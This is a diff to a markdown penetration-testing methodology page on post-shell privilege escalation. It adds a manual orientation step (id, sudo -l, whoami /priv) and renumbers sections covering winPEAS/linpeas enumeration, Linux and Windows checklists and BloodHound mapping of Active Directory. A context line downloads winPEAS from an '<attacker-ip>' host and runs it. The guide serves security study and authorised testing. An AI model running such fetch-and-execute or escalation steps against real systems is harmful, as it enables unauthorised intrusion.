@@ -12,9 +12,22 @@ The first thing to do after landing a shell is enumerate — not guess. Automate
 
 ## Methodology
 
-### 1. Run an Automated Enumeration Script
+### 1. Situational Awareness First
 
-Let the tool do the broad sweep first, then dig into what it flags.
+Before running any tooling, confirm who you are, where you are, and what access you already have. Thirty seconds of manual orientation often reveals the path without needing linpeas/winpeas at all.
+
+```bash
+id && sudo -l                          # Linux
+whoami /priv && whoami /groups          # Windows
+```
+
+See [Situational Awareness](situational-awareness.md) for the full first-look command set across Linux, Windows, and AD.
+
+---
+
+### 2. Run an Automated Enumeration Script
+
+Let the tool do the broad sweep next, then dig into what it flags.
 
 **Linux:**
 
@@ -33,7 +46,7 @@ iwr -uri http://<attacker-ip>/winPEASx64.exe -OutFile C:\Temp\winpeas.exe; .\win
 
 ---
 
-### 2. Linux — Work the Checklist
+### 3. Linux — Work the Checklist
 
 Check in this order — each step is faster than the one before it:
 
@@ -50,7 +63,7 @@ See [Local Enumeration](linux/local-enumeration.md), [Cron & SUID](linux/cron-su
 
 ---
 
-### 3. Windows — Work the Checklist
+### 4. Windows — Work the Checklist
 
 ```powershell
 whoami /priv                          # token privileges (SeImpersonate is game over)
@@ -66,7 +79,7 @@ See [Privilege Abuse](windows/privilege-abuse.md), [Service Exploitation](window
 
 ---
 
-### 4. Active Directory — Map the Path First
+### 5. Active Directory — Map the Path First
 
 Don't guess at AD attacks — collect BloodHound data first and let it show you the shortest path to Domain Admin.
 
